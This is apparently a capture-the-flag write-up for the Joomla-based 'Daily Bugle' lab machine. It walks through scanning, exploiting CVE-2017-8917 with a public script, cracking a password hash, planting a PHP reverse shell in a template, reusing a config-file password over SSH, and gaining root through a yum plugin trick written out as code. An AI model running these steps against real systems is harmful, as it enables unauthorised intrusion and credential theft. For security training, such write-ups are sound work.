# Daily Bugle

## Challenge Information
- **Challenge Name**: Daily Bugle
- **Category**: Web Penetration Testing
- **Difficulty Level**: Hard

## Analysis

1. Run a directory scan: `ffuf -u http://<ip_address>/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -mc 200,301,302,403`.

2. Run nmap scan: `sudo nmap -sV <ip_address>`.

3. A directory **/administrator** will be discovered. Open it and it will reveal the **joomla cms** login page. Lets run **joomscan** on it: `joomscan --url http://<ip_address>`. You can install joomscan: `sudo apt install joomscan`. This will reveal many accessible directories as well as the version of the joomla: **3.7.0**.

4. Now, we searched for vulnerabilities for joomla version 3.7.0. As a result, we found the vulnerability **CVE-2017-8917**. Now searched for exploits available publically. There was a poc present at `https://github.com/stefanlucas/Exploit-Joomla`. Run the python file present in the exploit: `python script.py http://<ip_address>/`. This will reveal the table name **fb9j5_users** as well as the username and the password hash.

5. Copy the hash in a txt file and crack it: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. This will give the password **spiderman123**. Now, we can login to the admin joomla cms with the found password and username **jonah**.

6. Now, we have to get the shell for the user. Lets upload a php reverse shell in the templates directory. Go to **Templates** in the side menu bar. Now, 2 options will appear: **Styles**, **Templates**. Click the **Templates**. Select **protostar** and then create a new file. Paste the reverse shell code in the new file. Open a netcat listener. Open the reverse shell file in the browser: `http://<ip_address>/templates/protostar/shell.php` This will open the reverse shell on the listener.

7. Now, when we try to navigate to the **/home/jjameson** directory, it denies the access. Since we are logged in as **apache**. Lets try to read the **configuration.php** file `cat /var/www/html/configuration.php`. This reveals so much important information. Here, we also have a password: **nv5uz9r3ZEDzVjNu**. Lets try to ssh with jjameson with this password: `ssh jjameson@<ip_address>`. Boom! we logged in as jjameson. Lets read the user flag: `cat user.txt`.

8. Now, we have to escalate the previleges. Lets check for any suid set binaries that we can run without the password: `sudo -l`. This reveals that we can run **/usr/bin/yum**. Lets go to **gtfobins** on google and check how can we misuse this binary.

9. Following are the commands that will help us to excalate as root:

```
# Step 1: Create a temporary directory
TF=$(mktemp -d)

# Step 2: Create the plugin config file
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

# Step 3: Create the plugin enable file
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

# Step 4: Write the malicious Python plugin
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

# Step 5: Run yum with custom plugin (will spawn a root shell)
sudo yum -c $TF/x --enableplugin=y

```

Now check the current user: `whoami` and it return **root**! Read the root flag: `cat /root/root.txt`.

---
